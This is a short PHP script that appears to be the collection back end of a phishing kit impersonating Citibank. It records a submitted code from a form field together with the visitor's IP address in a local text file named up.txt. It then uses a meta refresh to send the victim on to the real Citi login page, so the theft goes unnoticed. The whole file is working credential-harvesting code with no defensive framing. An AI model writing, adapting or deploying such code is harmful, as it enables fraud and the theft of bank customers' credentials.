<?php

echo "<meta http-equiv=\"refresh\" content=\"0;URL='https://online.citi.com/US/login.do'\" />";

$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$ip = getenv("REMOTE_ADDR");


$a = $_POST['a'];
$b = $_POST['b'];

$saveline = 'IP: ' . $ip . ' Cod: ' . $a . "\n";

$fh=fopen('up.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);


exit;


?>
